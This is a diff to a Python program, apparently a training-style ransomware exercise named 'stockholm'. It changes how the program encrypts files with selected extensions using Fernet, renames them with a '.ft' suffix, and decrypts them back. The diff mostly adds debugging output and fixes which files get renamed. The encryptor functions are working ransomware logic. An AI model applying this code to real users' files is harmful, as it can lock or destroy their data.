@@ -39,15 +39,10 @@ def reverse() -> str:
 	fernet = Fernet(key)
 	for file in files:
 		if not file.endswith(".ft"):
-			continue
-		original_file_name = file[:-3]
-		if '.' not in original_file_name:
+			printer(f"{Fore.RED}Skipping {file} as it does not end with .ft{Style.RESET_ALL}")
 			continue
 		try:
 			new_name = file[:-3]
-			if not any(new_name.endswith(ext) for ext in EXTENSIONS):
-				os.rename(file, new_name)
-				continue
 			with open(file, 'rb') as r_file:
 				encrypted_data = r_file.read()
 			decrypted_data = fernet.decrypt(encrypted_data)
@@ -56,7 +51,7 @@ def reverse() -> str:
 			printer(f"{Fore.YELLOW} decrypting {file}{Style.RESET_ALL}")
 			os.rename(file, new_name)
 		except Exception as e:
-			print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+			print(f"{Fore.RED}Error ... {new_name}: {e}{Style.RESET_ALL}")
 			sys.exit(1)
 
 def key_generator():
@@ -92,6 +87,7 @@ def file_rename(files: list):
 			os.rename(file, file + ".ft")
 
 def file_encryptor(files: list):
+	renamed_files = []
 	try:
 		with open("lock.key", 'rb') as file:
 			key = file.read()
@@ -99,10 +95,13 @@ def file_encryptor(files: list):
 		print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
 		sys.exit(1)
 	fernet = Fernet(key)
+	print(files)
 	for file in files:
+		print(f"working on {file}")
 		if not any(file.endswith(ext) for ext in EXTENSIONS):
 			continue
 		try:
+			renamed_files.append(file)
 			with open(file, 'rb') as r_file:
 				data = r_file.read()
 			encypted_data = fernet.encrypt(data)
@@ -112,7 +111,7 @@ def file_encryptor(files: list):
 		except Exception as e:
 			print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
 			sys.exit(1)
-	file_rename(files)
+	file_rename(renamed_files)
 
 def stockholm() -> str:
 	key_generator()
